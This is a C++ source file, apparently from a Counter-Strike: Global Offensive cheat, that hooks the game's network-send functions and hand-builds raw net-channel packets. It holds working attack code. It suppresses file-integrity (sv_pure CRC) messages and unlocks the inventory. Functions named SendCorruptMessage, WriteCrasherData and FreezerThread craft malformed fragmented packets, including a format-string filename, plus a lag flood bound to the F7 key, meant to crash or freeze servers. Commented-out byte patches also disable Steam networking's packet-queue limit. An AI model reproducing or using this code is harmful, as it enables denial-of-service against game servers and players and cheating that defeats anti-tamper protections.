    static std::uintptr_t uLoadoutAllowedReturn = (MEM::FindPattern(CLIENT_DLL, XorStr("75 04 B0 01 5F")) - 0x2);

    // @credits: gavreel
    if (reinterpret_cast<std::uintptr_t>(_ReturnAddress()) == uLoadoutAllowedReturn && C::Get<bool>(Vars.bMiscUnlockInventory))
        return false;

    return oIsConnected(thisptr, edx);
}

bool FASTCALL H::hkProcessPacketEntities(DWORD* ecx)
{
    static auto oProcessPacketEntities = DTR::SendNetMsg.GetOriginal<decltype(&hkProcessPacketEntities)>();
    bool result = oProcessPacketEntities(ecx);
    //FreezerThread();
    return result;
}
class CNetMessage 
{
public:
    CNetMessage() {
        m_bReliable = true;
        m_NetChannel = NULL;
    }

    virtual ~CNetMessage() {};

    virtual int		getGroup() const { return 0; }
    INetChannel* getNetChannel() const { return m_NetChannel; }

    virtual void	SetReliable(bool state) { m_bReliable = state; };
    virtual bool	IsReliable() const { return m_bReliable; };
    virtual void    SetNetChannel(INetChannel* netchan) { m_NetChannel = netchan; }
    virtual bool	Process() { return false; };	// no handler set


    bool				m_bReliable;	// true if message should be send reliable
    INetChannel* m_NetChannel;	// netchannel this message is from/for
};
class NET_SignonState : public CNetMessage
{
    //DECLARE_NET_MESSAGE(Tick);
public:
    uint32_t signon_state;
    uint32_t spawn_count;
    uint32_t num_server_players;
    char players_networkids[1024];
    char map_name[1024];

};

bool FASTCALL H::hkSendNetMsg(INetChannel* thisptr, int edx, INetMessage* pMessage, bool bForceReliable, bool bVoice)
{
    static auto oSendNetMsg = DTR::SendNetMsg.GetOriginal<decltype(&hkSendNetMsg)>();

    /*
     * @note: disable files crc check (sv_pure)
     * dont send message if it has FileCRCCheck type
     */

    if (pMessage->getType() > 0 && pMessage->getType() <= 20 && lastCmds[pMessage->getType()].buf == nullptr) {
        lastCmds[pMessage->getType()].buf = reinterpret_cast<char*>(malloc((NET_MAX_MESSAGE - (1260 * 50))));
        bf_write penis(lastCmds[pMessage->getType()].buf, (NET_MAX_MESSAGE - (1260 * 50)));
        pMessage->WriteToBuffer(&penis);
        lastCmds[pMessage->getType()].size = penis.GetNumBytesWritten();
        lastCmds[pMessage->getType()].bitbuf = &penis;
    }

    if (pMessage->getType() == net_Disconnect) {
        return false;
    }
    
    if (pMessage->getType() == net_SignonState) {
        NET_SignonState* signon = reinterpret_cast<NET_SignonState*>(pMessage);
        lastSpawnCount = signon->spawn_count;

        //snprintf(buffer, 4095, formatter, signon->signon_state, signon->spawn_count, signon->num_server_players);
    }
    /*
    if (pMessage->getType() == 9) {
    //	I::Prediction->bInPrediction = true;
        if (lastMoveCmd == nullptr)
            lastMoveCmd = reinterpret_cast<char*>(malloc((NET_MAX_MESSAGE - (1260 * 50))));
        else {
            free(lastMoveCmd);
            lastMoveCmd = reinterpret_cast<char*>(malloc((NET_MAX_MESSAGE - (1260 * 50))));
        }
        bf_write penis(lastMoveCmd, (NET_MAX_MESSAGE - (1260 * 50)));
        pMessage->WriteToBuffer(&penis);
        lastMoveCmdSize = penis.GetNumBytesWritten();
        //return false;
    }*/
    if (pMessage->getType() == 14) {
        return false;
    }
    /*if (pMessage->getType() == 9) {
        free(lastMoveCmd);
        lastMoveCmd = reinterpret_cast<char*>(malloc(523956));
        bf_write penis(lastMoveCmd, 523956);
        pMessage->WriteToBuffer(&penis);
        lastMoveCmdSize = penis.GetNumBytesWritten();
    }*/
    //if (pMessage->getType() == 9) {
    //	bVoice = true;
    //}
    /*
*/
/*
 * @note: fix lag with chocking packets when voice chat is active
 * check for voicedata group and enable voice stream
 * @credits: Flaww
 */
    if (pMessage->getGroup() == INetChannelInfo::VOICE)
        bVoice = true;
    int retval = oSendNetMsg(thisptr, edx, pMessage, bForceReliable, bVoice);

    return retval;
}
// each channel packet has 1 byte of FLAG bits
#define PACKET_FLAG_RELIABLE			(1<<0)	// packet contains subchannel stream data
#define PACKET_FLAG_COMPRESSED			(1<<1)	// packet is compressed
#define PACKET_FLAG_ENCRYPTED			(1<<2)  // packet is encrypted
#define PACKET_FLAG_SPLIT				(1<<3)  // packet is split
#define PACKET_FLAG_CHOKED				(1<<4)  // packet was choked by sender
#define ENCODE_PAD_BITS( x ) ( ( x << 5 ) & 0xff )
/*/inline int GetBitForBitnum(int bitNum)
{
    static int bitsForBitnum[] =
    {
        (1 << 0),
        (1 << 1),
        (1 << 2),
        (1 << 3),
        (1 << 4),
        (1 << 5),
        (1 << 6),
        (1 << 7),
        (1 << 8),
        (1 << 9),
        (1 << 10),
        (1 << 11),
        (1 << 12),
        (1 << 13),
        (1 << 14),
        (1 << 15),
        (1 << 16),
        (1 << 17),
        (1 << 18),
        (1 << 19),
        (1 << 20),
        (1 << 21),
        (1 << 22),
        (1 << 23),
        (1 << 24),
        (1 << 25),
        (1 << 26),
        (1 << 27),
        (1 << 28),
        (1 << 29),
        (1 << 30),
        (1 << 31),
    };

    return bitsForBitnum[(bitNum) & (32 - 1)];
}*/
FORCEINLINE unsigned short BufferToShortChecksum(const void* pvData, size_t nLength)
{
    CRC32_t crc = CRC32::ProcessSingleBuffer(pvData, nLength);

    unsigned short lowpart = (crc & 0xffff);
    unsigned short highpart = ((crc >> 16) & 0xffff);

    return (unsigned short)(lowpart ^ highpart);
}



bool SendOurMessage(INetChannel* pNetChannel,
    void* pData,
    size_t nDataSize,
    bool bAsFragmentedReliale /*= false*/,
    bool bCompress /*= false*/,
    bool bTcp /*= false*/,
    bool bSendAsChoked /*= false*/,
    int nChokedAmount = 1) {

    if (!pNetChannel || pNetChannel == nullptr || I::Engine->GetNetChannelInfo() == nullptr)
        return false;


 //   std::stringstream stream;
   // stream << std::hex << std::string((char*)pData);
  //  std::string result(stream.str());

    //I::ConVar->ConsolePrintf(("Would have just sent message: "+ result).c_str());
    //return true;

    // This is dumb don't do this
    //if (pNetChannel != interfaces->engine->getNetworkChannel())
    //	return false;
    //NetworkingMutex.lock();

    byte		send_buf[NET_MAX_MESSAGE];
    bf_write send(send_buf, NET_MAX_MESSAGE);
    send.m_iCurBit = 0;
    unsigned char flags = 0;
    //Debug::QuickPrint("212");

    *(float*)((uintptr_t)I::Engine->GetNetworkChannel() + (uintptr_t)16732) = -1;

    //pNetChannel->OutSequenceNr++;
    send.WriteLong(pNetChannel->iOutSequenceNr);
    send.WriteLong(pNetChannel->iInSequenceNr);


    bf_write flagsPos = send; // remember flags byte position

    send.WriteByte(0); // write correct flags value later
    send.WriteShort(0);  // write correct checksum later


    int nCheckSumStart = send.GetNumBytesWritten();

    send.WriteByte(pNetChannel->iInReliableState);

    if ((pNetChannel->iChokedPackets > 0) && bSendAsChoked)
    {
        int nChoked = nChokedAmount ? nChokedAmount : pNetChannel->iChokedPackets;
        flags |= PACKET_FLAG_CHOKED;
        send.WriteByte(pNetChannel->iChokedPackets & 0xFF);	// send number of choked packets
    }

    if (bAsFragmentedReliale) { /* We Are Sending It As Reliable Data Fragments */
        flags |= PACKET_FLAG_RELIABLE;
        //SendAsFragmentedData(send, pData, nDataSize, bTcp, bCompress);
    }
    else { /* We Are Sending It As Unreliable normal ass data */
        if ((nDataSize * 8) < send.GetNumBitsLeft())
        {
            send.WriteBits(pData, (nDataSize * 8));
        }
        else
        {
            //Debug::QuickPrint("SendOurMessage:  data would overfow, ignoring\n");
        }
    }


    //Debug::QuickPrint("249");
    int nMinRoutablePayload = 576;
    while (send.GetNumBytesWritten() < nMinRoutablePayload)
    {
        //Debug::QuickPrint("253");
        // Go ahead and pad some bits as long as needed
        CNETMsg_NOP nop;
        WriteProtobufToBuffer(&nop, &send, net_NOP);

    }


    // Make sure we have enough bits to read a final net_NOP opcode before compressing 
    int nRemainingBits = send.GetNumBitsWritten() % 8;
    if (nRemainingBits > 0 && nRemainingBits <= (8 - 5))
    {
        //Debug::QuickPrint("259");
        CNETMsg_NOP nop;
        WriteProtobufToBuffer(&nop, &send, net_NOP);
    }

    //Debug::QuickPrint("269");
    // if ( IsX360() )
    {
        // Now round up to byte boundary
        nRemainingBits = send.GetNumBitsWritten() % 8;
        if (nRemainingBits > 0)
        {
            int nPadBits = 8 - nRemainingBits;

            flags |= ENCODE_PAD_BITS(nPadBits);

            // Pad with ones
            if (nPadBits > 0)
            {
                unsigned int unOnes = GetBitForBitnum(nPadBits) - 1;
                //send.WriteUBitLong(unOnes, nPadBits);
            }
        }
    }
    //Debug::QuickPrint("288");
    // write correct flags value and the checksum
    flagsPos.WriteByte(flags);

    // Compute checksum (must be aligned to a byte boundary!!)
    if (true/*ShouldChecksumPackets()*/)
    {
        const void* pvData = send.GetData() + nCheckSumStart;
        int nCheckSumBytes = send.GetNumBytesWritten() - nCheckSumStart;
        unsigned short usCheckSum = BufferToShortChecksum(pvData, nCheckSumBytes);
        flagsPos.WriteUBitLong(usCheckSum, 16);
    }
    //Debug::QuickPrint("302");
    typedef int((__fastcall* NSPo)(INetChannel*, unsigned char*, int, void*, bool));
    static NSPo NET_SendPacket = reinterpret_cast<NSPo>(ACTUAL_ADDRESS_IN_FIRST_OPCODE("engine", "E8 ? ? ? ? C7 87 ? ? ? ? ? ? ? ? 83 C4 0C"));



    /* TODO: Rewrite NET_SendPacket So We Handle Everything Ourselves */
    //Debug::QuickPrint("Sending Packet Out!");
    pNetChannel->iOutSequenceNr++;
    int	bytesSent = NET_SendPacket(pNetChannel, send.GetData(), send.GetNumBytesWritten(), 0, bCompress);
    _asm add esp, 12
    //int bytesSent = OurSendPacket(pNetChannel, send.GetData(), send.GetNumBytesWritten(), 0, 0, 1);
    //Debug::QuickPrint(("bytesSent = " + std::to_string(bytesSent)).c_str());


    //pNetChannel->chokedPackets = 0;
//LOCK_EXIT:
    //NetworkingMutex.unlock();
}


bool SendCorruptMessage(INetChannel* pNetChannel,
    bool bAsFragmentedReliale /*= false*/,
    bool bCompress /*= false*/,
    bool bTcp /*= false*/,
    bool bSendAsChoked /*= false*/,
    int nChokedAmount = 1) {

    if (!pNetChannel || pNetChannel == nullptr || I::Engine->GetNetChannelInfo() == nullptr || !I::Engine->IsConnected())
        return false;


    // This is dumb don't do this
    //if (pNetChannel != interfaces->engine->getNetworkChannel())
    //	return false;
    //NetworkingMutex.lock();

    byte		send_buf[NET_MAX_MESSAGE];
    bf_write send(send_buf, NET_MAX_MESSAGE);
    send.m_iCurBit = 0;
    unsigned char flags = 0;
    //Debug::QuickPrint("212");


    //pNetChannel->OutSequenceNr++;
    send.WriteLong(pNetChannel->iOutSequenceNr);
    send.WriteLong(pNetChannel->iInSequenceNr);


    bf_write flagsPos = send; // remember flags byte position

    send.WriteByte(0); // write correct flags value later
    send.WriteShort(0);  // write correct checksum later


    int nCheckSumStart = send.GetNumBytesWritten();

    send.WriteByte(pNetChannel->iInReliableState);

    if ((pNetChannel->iChokedPackets > 0) && bSendAsChoked)
    {
        int nChoked = nChokedAmount ? nChokedAmount : pNetChannel->iChokedPackets;
        flags |= PACKET_FLAG_CHOKED;
        send.WriteByte(pNetChannel->iChokedPackets & 0xFF);	// send number of choked packets
    }



    //Debug::QuickPrint("249");
    int nMinRoutablePayload = 576;
    while (send.GetNumBytesWritten() < nMinRoutablePayload)
    {
        //Debug::QuickPrint("253");
        // Go ahead and pad some bits as long as needed
        CNETMsg_NOP nop;
        WriteProtobufToBuffer(&nop, &send, net_NOP);

    }


    // Make sure we have enough bits to read a final net_NOP opcode before compressing 
    int nRemainingBits = send.GetNumBitsWritten() % 8;
    if (nRemainingBits > 0 && nRemainingBits <= (8 - 5))
    {
        //Debug::QuickPrint("259");
        CNETMsg_NOP nop;
        WriteProtobufToBuffer(&nop, &send, net_NOP);
    }

    //Debug::QuickPrint("269");
    // if ( IsX360() )
    {
        // Now round up to byte boundary
        nRemainingBits = send.GetNumBitsWritten() % 8;
        if (nRemainingBits > 0)
        {
            int nPadBits = 8 - nRemainingBits;

            flags |= ENCODE_PAD_BITS(nPadBits);

            // Pad with ones
            if (nPadBits > 0)
            {
                unsigned int unOnes = GetBitForBitnum(nPadBits) - 1;
                //send.WriteUBitLong(unOnes, nPadBits);
            }
        }
    }
    //Debug::QuickPrint("288");
    // write correct flags value and the checksum
    flagsPos.WriteByte(flags);

    // Compute checksum (must be aligned to a byte boundary!!)
    if (true/*ShouldChecksumPackets()*/)
    {
        const void* pvData = send.GetData() + nCheckSumStart;
        int nCheckSumBytes = send.GetNumBytesWritten() - nCheckSumStart;
        unsigned short usCheckSum = BufferToShortChecksum(pvData, nCheckSumBytes);
        flagsPos.WriteUBitLong(usCheckSum, 16);
    }
    typedef int((__fastcall* NSPo)(INetChannel*, unsigned char*, int, void*, bool));
    static NSPo NET_SendPacket = reinterpret_cast<NSPo>(ACTUAL_ADDRESS_IN_FIRST_OPCODE("engine", "E8 ? ? ? ? C7 87 ? ? ? ? ? ? ? ? 83 C4 0C"));

    /* TODO: Rewrite NET_SendPacket So We Handle Everything Ourselves */
    //Debug::QuickPrint("Sending Packet Out!");
    if (I::Engine->GetNetChannelInfo() != nullptr && pNetChannel != nullptr && I::Engine->IsConnected()) {
        //pNetChannel->iOutSequenceNr++;
        int	bytesSent = NET_SendPacket(pNetChannel, send.GetData(), send.GetNumBytesWritten(), 0, false);
        _asm add esp, 12;
    }

}
struct FileHash_t
{
    enum EFileHashType_t
    {
        k_EFileHashTypeUnknown = 0,
        k_EFileHashTypeEntireFile = 1,
        k_EFileHashTypeIncompleteFile = 2,
    };
    FileHash_t()
    {
        m_eFileHashType = FileHash_t::k_EFileHashTypeUnknown;
        m_cbFileLen = 0;
        m_PackFileID = 0;
        m_nPackFileNumber = 0;
    }
    int m_eFileHashType;
    CRC32_t m_crcIOSequence;
    MD5Value_t m_md5contents;
    int m_cbFileLen;
    int m_PackFileID;
    int m_nPackFileNumber;

    bool operator==(const FileHash_t& src) const
    {
        return m_crcIOSequence == src.m_crcIOSequence &&
            m_md5contents == src.m_md5contents &&
            m_eFileHashType == src.m_eFileHashType;
    }
    bool operator!=(const FileHash_t& src) const
    {
        return m_crcIOSequence != src.m_crcIOSequence ||
            m_md5contents != src.m_md5contents ||
            m_eFileHashType != src.m_eFileHashType;
    }

};
class CUnverifiedFileHash
{
public:
    char m_PathID[MAX_PATH];
    char m_Filename[MAX_PATH];
    int m_nFileFraction;
    FileHash_t m_FileHash;
};


inline unsigned long CRC32_ConvertToUnsignedLong(CRC32_t* pulCRC)
{
    return (unsigned long)(*pulCRC);
}
CRC32_t CalculateCRCForFile(std::string sex)
{
    CRC32_t crc;
    FILE* fp = fopen(sex.c_str(), "rb");

    // Calculate the CRC.
    unsigned int initialFilePos = ftell(fp);

    fseek(fp, 0, 1);

#define    CRC_CHUNK_SIZE    (32*1024)
    char tempBuf[CRC_CHUNK_SIZE];

    CRC32::Init(&crc);
    fseek(fp, 0, SEEK_END); // seek to end of file
    unsigned int fileLength = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    int nChunks = fileLength / CRC_CHUNK_SIZE + 1;
    unsigned int curStartByte = 0;
    for (int iChunk = 0; iChunk < nChunks; iChunk++)
    {
        int curEndByte = (std::min)(curStartByte + CRC_CHUNK_SIZE, fileLength);
        int chunkLen = curEndByte - curStartByte;
        if (chunkLen == 0)
            break;
        fread(tempBuf, chunkLen, 1, fp);
        CRC32::ProcessBuffer(&crc, tempBuf, chunkLen);

        curStartByte += CRC_CHUNK_SIZE;
    }
    CRC32::Final(&crc);

    // Go back to where we started.
    fseek(fp, 0, SEEK_SET);
    return crc;
}


std::string get_file_hash(const char* filename)
{
    std::ifstream in(filename, std::ios::in | std::ios::binary);
    if (in)
    {
        std::string contents;
        in.seekg(0, std::ios::end);
        contents.resize(in.tellg());
        in.seekg(0, std::ios::beg);
        in.read(&contents[0], contents.size());
        in.close();
        return(md5(contents).raw());
    }
    throw(errno);
}
//auto string_j = std::to_string(j);
//string_j.insert(0, 3 - string_j.length(), '0');
//std::string path = "C:\\Program Files (x86)\\steam\\steamapps\\common\\Counter-Strike Global Offensive\\csgo\\maps\\de_mocha.bsp";
//static std::string finalHash = get_file_hash(path.c_str());
//AllocConsole();
//	freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);
    //for (int i = 0; i < 5; i++) {
        //WriteProtobufToBuffer(&sex, &buffStat, net_SetConVar);
        //WriteProtobufToBuffer(&sex2, &buffStat, net_SetConVar);
//	int k = 0;
//int j = 0;
    //CNETMsg_SetConVar_t sex("voice_loopback", "1");
    //CNETMsg_SetConVar_t sex2("voice_loopback", "0");
    //WriteProtobufToBuffer(&sex2, &buffStat, net_SetConVar);
//}

// typedef int64_t(__thiscall* SNPNextThink)(void*, int64_t usecNow);

typedef struct
{
    int		netID;
    int		sequenceNumber;
    int		packetID : 16;
    int		nSplitSize : 16;
} SPLITPACKET;
#define MAX_ROUTABLE_PAYLOAD		1260	// Matches x360 size

#define MAX_SPLIT_SIZE	(1260 - sizeof( SPLITPACKET ))
#define MIN_SPLIT_SIZE	(576 - sizeof( SPLITPACKET ))

#define MAX_SPLITPACKET_SPLITS ( NET_MAX_MESSAGE / MIN_SPLIT_SIZE )
#define NET_HEADER_FLAG_SPLITPACKET				-2
#define NET_HEADER_FLAG_COMPRESSEDPACKET		-3
#define CONNECTIONLESS_HEADER			0xFFFFFFFF	// all OOB packet start with this sequence

inline void ehQ_memcpy(void* dest, void* src, int count)
{
    int  i;

    if ((((long)dest | (long)src | count) & 3) == 0)
    {
        count >>= 2;
        for (i = 0; i < count; i++)
            ((int*)dest)[i] = ((int*)src)[i];
    }
    else
        for (i = 0; i < count; i++)
            ((std::byte*)dest)[i] = ((std::byte*)src)[i];
}
int CUSTOM_NET_SendLong(void* chan, unsigned char* sendbuf, int sendlen, int nMaxRoutableSize, bool Encrypt = false, bool Decrypt = true)
{

    INetChannel* netchan = reinterpret_cast<INetChannel*>(chan);

    short nSplitSizeMinusHeader = nMaxRoutableSize - sizeof(SPLITPACKET);






    int nSequenceNumber = -1;



    char			packet[MAX_ROUTABLE_PAYLOAD];
    SPLITPACKET* pPacket = (SPLITPACKET*)packet;

    // Make pPacket data network endian correct
    pPacket->netID = LittleLong(NET_HEADER_FLAG_SPLITPACKET);
    pPacket->nSplitSize = LittleShort(576);
    if (nSplitSizeMinusHeader < 576) {
        pPacket->nSplitSize = LittleShort(576);
    }

#ifdef FORCE_NET_SENDLONG_COMPRESS
    if (Encrypt) {
        int savedsendlen = sendlen;
        if (sendlen) {
            if (Decrypt)
                sendlen = DecryptPacket((NetworkChannel*)chan, sendbuf, sendlen);

            int decsaved = sendlen;
            if (sendlen < 576)
                sendlen = ((576 * 2) - sendlen) + sendlen;
            //if ((sendlen < savedsendlen) || (sendlen < 576))
            //	return savedsendlen;
            unsigned char* sendbuf2 = (unsigned char*)malloc(sendlen);
            EngineHooks::ehQ_memcpy(sendbuf2, sendbuf, decsaved);
            if (sendbuf2)
                sendbuf = sendbuf2;
            CheckSumPacket(sendbuf, sendlen);
        }


        if (Encrypt && (*(unsigned int*)sendbuf != LittleLong((unsigned int)NET_HEADER_FLAG_COMPRESSEDPACKET)) && false) {
            if (!compressPacket) {
                compressPacket = (unsigned char*)malloc((NET_MAX_MESSAGE * 8));
            }
            static CLZSS Compressor;
            unsigned int Size;
            int ret = (int)Compressor.CompressNoAlloc((unsigned char*)socket, sendlen, compressPacket + sizeof(unsigned int), &Size); /* Actually Leave's 4 */
            if (!compressPacket)
                return sendlen;
            *(unsigned int*)compressPacket = LittleLong((unsigned int)NET_HEADER_FLAG_COMPRESSEDPACKET);
            sendbuf = compressPacket;
        }

        if (Encrypt) {
            sendlen = EncrptPacket((NetworkChannel*)chan, sendbuf, sendlen);
        }
    }
#endif
    unsigned int nPacketCount = (sendlen + nSplitSizeMinusHeader - 1) / nSplitSizeMinusHeader;

    if (nPacketCount > MAX_SPLITPACKET_SPLITS)
        nPacketCount = MAX_SPLITPACKET_SPLITS;

    nPacketCount = std::clamp(nPacketCount, 1u, 127u);

    int nBytesLeft = sendlen;
    int nPacketNumber = 0;
    int nTotalBytesSent = 0;
    int nFragmentsSent = 0;
    pPacket->packetID = -1;
    nSequenceNumber = ++(((DWORD*)chan)[4196]);
    pPacket->sequenceNumber = LittleLong(nSequenceNumber);



    while (nBytesLeft > 0)
    {
        int size = (std::min)((int)nSplitSizeMinusHeader, nBytesLeft);

        if (nPacketNumber >= MAX_SPLITPACKET_SPLITS)
            return nTotalBytesSent;

        pPacket->packetID = LittleShort((short)((nPacketNumber << 8) + nPacketCount));

        ehQ_memcpy(packet + sizeof(SPLITPACKET), (void*)((uintptr_t)sendbuf + (nPacketNumber * nSplitSizeMinusHeader)), size);

        int ret = 0;
        // https://git.byr.ac.cn/Gaojianli/cstrike15_src/-/blob/34f0997fbe5efa778d296a013baf12a00faa608d/engine/net_ws.cpp
        //ret = NET_SendTo(To, netchann, size+12, -1);
        int To = -2;
        int* toAddr = &To;
        int ASMSIZE = size + 12;
        void* callSentToPtr = (void*)relativeToAbsolute<std::uintptr_t>(MEM::FindPattern("engine.dll", "E8 ? ? ? ? 83 C4 08 FF 45 F8") + 1);


        //Debug::QuickPrint("Calling Calls_SentToImpl");

        __asm {
            mov     eax, ASMSIZE
            push    0FFFFFFFFh
            push    eax
            lea     edx, packet
            mov		ecx, netchan
            call callSentToPtr
            add esp, 8
            mov ret, eax
        }

        //ret = ((Calls_SendToImplFunc2)memory->Calls_SendToImpl)(&To, sendbuf, size + 12, -1);
        ++nFragmentsSent;
        //Debug::QuickPrint(("NET_SendLong_Rebuilt Ret = " + std::to_string(ret)).c_str());
        if (ret < 0)
        {
            return ret;
        }

        if (ret >= size)
        {
            nTotalBytesSent += size;
        }



        nBytesLeft -= size;
        ++nPacketNumber;

        if (nPacketNumber > 128)
            return nTotalBytesSent + nBytesLeft;


        // Always bitch about split packets in debug
    }

    return nTotalBytesSent;
}
std::uintptr_t keyValuesFromString;
/*
class KeyValues {
public:
    static KeyValues* fromString(const char* name, const char* value) noexcept;
    KeyValues* findKey(const char* keyName, bool create) noexcept;
    void setString(const char* keyName, const char* value) noexcept;
};

KeyValues* KeyValues::fromString(const char* name, const char* value) noexcept
{
#ifdef _WIN32
    const auto keyValuesFromString2 = relativeToAbsolute<decltype(keyValuesFromString)>(MEM::FindPattern(CLIENT_DLL, "E8 ? ? ? ? 83 C4 04 89 45 D8") + 1);
    KeyValues* keyValues;
    __asm {
        push 0
        mov edx, value
        mov ecx, name
        call keyValuesFromString2
        add esp, 4
        mov keyValues, eax
    }
    return keyValues;
#else
    return reinterpret_cast<KeyValues * (*)(const char*, const char*, const char**)>(memory->keyValuesFromString)(name, value, nullptr);
#endif
}
KeyValues* (__thiscall* keyValuesFindKey)(KeyValues* keyValues, const char* keyName, bool create);
void(__thiscall* keyValuesSetString)(KeyValues* keyValues, const char* value);

KeyValues* KeyValues::findKey(const char* keyName, bool create) noexcept
{
    return relativeToAbsolute<decltype(keyValuesFindKey)>(MEM::FindPattern(CLIENT_DLL, "E8 ? ? ? ? F7 45") + 1)(this, keyName, create);
}

void KeyValues::setString(const char* keyName, const char* value) noexcept
{
    if (const auto key = findKey(keyName, true))
        relativeToAbsolute<decltype(keyValuesSetString)>(MEM::FindPattern(CLIENT_DLL, "E8 ? ? ? ? 4C 89 E6 4C 89 FF E8 ? ? ? ? 48 8B 03") + 1)(key, value);
}
*/

#define NET_MAX_PAYLOAD_BITS 19
#define MAX_FILE_SIZE_BITS 26
#define MAX_FILE_SIZE        ((1<<MAX_FILE_SIZE_BITS)-1)
#define FRAGMENT_BITS        8
#define FRAGMENT_SIZE        (1<<FRAGMENT_BITS)
#define BYTES2FRAGMENTS(i) ((i+FRAGMENT_SIZE-1)/FRAGMENT_SIZE)
#define NET_MAX_PAYLOAD 524284
typedef struct dataFragments_s
{

    void* file;			// open file handle
    char			filename[MAX_PATH]; // filename
    //std::byte pad[61];
    char* buffer;			// if NULL it's a file
    unsigned int	bytes;			// size in bytes
    unsigned int	bits;			// size in bits
    unsigned int	transferID;		// only for files
    bool			isCompressed;	// true if data is bzip compressed
    unsigned int	nUncompressedSize; // full size in bytes
    bool			asTCP;			// send as TCP stream
    bool            isReplayDemo;
    int				numFragments;	// number of total fragments
    int				ackedFragments; // number of fragments send & acknowledged
    int				pendingFragments; // number of fragments send, but not acknowledged yet
} dataFragments_t;


void WriteFragmentsToSubChannel(void* netchannel, dataFragments_t* data, bf_write* buf, int stream, int totalBytes, bool File = false, bool NULLFILE = false) {
    buf->WriteUBitLong(stream, 3); // SubChannel
    buf->WriteOneBit(1); // Data Follows

    if (!File) {
        buf->WriteOneBit(0); // We Are Using A Single Block
        buf->WriteOneBit(1); // Data Is Compressed
        buf->WriteUBitLong(data->nUncompressedSize, MAX_FILE_SIZE_BITS); // Data Size
        buf->WriteUBitLong(data->bytes, 17); // Data Size Of Buff
        //buf->WriteBytes(data->buffer, totalBytes); // Finally Write Buffer Data	
    }
    else {
        buf->WriteOneBit(1); // Not Single Block
        buf->WriteUBitLong(0, (MAX_FILE_SIZE_BITS - FRAGMENT_BITS)); // startFragment
        buf->WriteUBitLong(0, 3); // numFragment

        buf->WriteOneBit(1); // A File

        if (!NULLFILE) {
            buf->WriteUBitLong(600, 32);
            buf->WriteString(data->filename);
        }
        else {
            buf->WriteUBitLong(999, 32);
            buf->WriteString("%s%s%s%s\0");
        }
        // transfer ID
        // fileName


        buf->WriteOneBit(0);


        buf->WriteOneBit(1); // Data Compressed


        buf->WriteUBitLong(data->bytes, MAX_FILE_SIZE_BITS); // Data Bytes
    }

    buf->WriteBytes(data->buffer, totalBytes); // Finally Write Buffer Data	


}
#define MAX_EVENT_BITS			9		// max bits needed for an event index
#define MAX_EVENT_NUMBER		(1<<MAX_EVENT_BITS)		// max number of events allowed
void WriteCrasherData(bf_write* buf, dataFragments_t* data, int size, int stream) {


    buf->WriteUBitLong(stream, 3); // SubChannel Index

    buf->WriteOneBit(1); // Data Follows

    //buf->WriteOneBit(1); // Not Single Block (Too Allow File Transfer)


    buf->WriteOneBit(1); // uses fragments with start fragment offset byte

    buf->WriteUBitLong(0, MAX_FILE_SIZE_BITS - FRAGMENT_BITS);

    buf->WriteUBitLong(1, 3);  // Write it to 0


    // We are first fragment (make sure you assure that.)

    buf->WriteOneBit(1); // It "Is A File" (Bypass ProcessMessages & "Process Time Exceeded" )

    buf->WriteUBitLong(data->transferID, 32);

    //buf->WriteString(data->filename);
    buf->WriteByte(1);
    buf->WriteByte(0);

    buf->WriteOneBit(0); // Not A Replay Demo

    buf->WriteOneBit(1); // Data is compressed (HIT LZSS)

    //buf->WriteUBitLong(*(data->buffer + sizeof(int32_t)), MAX_FILE_SIZE_BITS);
    buf->WriteUBitLong(data->nUncompressedSize, MAX_FILE_SIZE_BITS);
    buf->WriteUBitLong(data->bytes, MAX_FILE_SIZE_BITS);

    buf->WriteBytes(data->buffer, size); // write data
}
#define SNAPPY_ID  (('S'<<24)|('N'<<16)|('A'<<8)|('P'))
unsigned int WINAPI H::FreezerThread()
{
    //	I::Prediction->bInPrediction = true;

    static int nDataPacketSize{ 0 };
    static int nBytesWritten{ 0 };
    static bool bInitialized{ false };
    //static void* NET_SentTo{ g_pMemory->GetAddress(__NETSENDTO) };
    static char* pPacketBuffer{ 0 };
    SPLITPACKET* pSplitPacket{ nullptr };
    if (!bInitialized) // If Calling Thread Multiple Times
    {
        // Setup Packet
        /*
        bInitialized = true;
        pPacketBuffer = reinterpret_cast<char*>(malloc(MAX_ROUTABLE_PAYLOAD + sizeof(SPLITPACKET))) + sizeof(SPLITPACKET);
        bf_write bwMessage(pPacketBuffer, MAX_ROUTABLE_PAYLOAD);
        bwMessage.WriteLong(CONNECTIONLESS_HEADER);
        bwMessage.WriteByte('k');
        nBytesWritten = (std::min)(13, bwMessage.GetNumBytesWritten());
        pPacketBuffer -= sizeof(SPLITPACKET);
        pSplitPacket = reinterpret_cast<SPLITPACKET*>(pPacketBuffer);
        pSplitPacket->nSplitSize = LittleShort(576);
        pSplitPacket->netID = LittleLong(NET_HEADER_FLAG_SPLITPACKET);*/
        // Byte Patch Bullshit
#if 0
        auto TooManyQueuedPackets = MEM::FindPattern("steamnetworkingsockets.dll", "8D 0C 16") + 3;
        auto TooManyQueuedPackets2 = MEM::FindPattern("steamnetworkingsockets.dll", "3B 08 7E 54") + 2;
        unsigned long protect = 0;
        VirtualProtect((void*)TooManyQueuedPackets, 2, PAGE_EXECUTE_READWRITE, &protect); /* cause jle to not set */
        *(std::byte*)TooManyQueuedPackets = (std::byte)0x90;
        *(std::byte*)(TooManyQueuedPackets + sizeof(std::byte)) = (std::byte)0x90; /* Remove Compare */
        VirtualProtect((void*)TooManyQueuedPackets, 2, protect, &protect);
        VirtualProtect((void*)TooManyQueuedPackets2, 1, PAGE_EXECUTE_READWRITE, &protect);
        if (*(std::byte*)(TooManyQueuedPackets2) == (std::byte)0x7E) {
            *(std::byte*)(TooManyQueuedPackets2) = (std::byte)0xEB; /* jle -> jmp */
            //Debug::QuickPrint("JLE -> JMP");
        }
        VirtualProtect((void*)TooManyQueuedPackets2, 1, protect, &protect);
#endif


    }
    const int pBufferSize = (NET_MAX_MESSAGE - (1260 * 50));
    char* pSignOnBuffer = (char*)malloc(pBufferSize);
    bf_write send("LAG", &pSignOnBuffer, 1024 * 1024 * 8);
    for (int i = 0; i < 4000; i++)
        send.WriteByte(0x0);

    if (GetAsyncKeyState(VK_F7) & 0x8000) 
        SendOurMessage(I::Engine->GetNetworkChannel(), send.GetData(), send.GetNumBytesWritten(), false, true, true, false);

    //	CCLCMsg_ListenEvents e;
    //	e.set_event_mask(0, 0);
    /*if (last_ecx != nullptr) {
        isCallingClMove = true;
        DTR::ClMove.GetOriginal<decltype(&hkClMove)>()(last_ecx, NULL, true);
        //typedef void(__cdecl* CL_MoveFn)(float, bool);
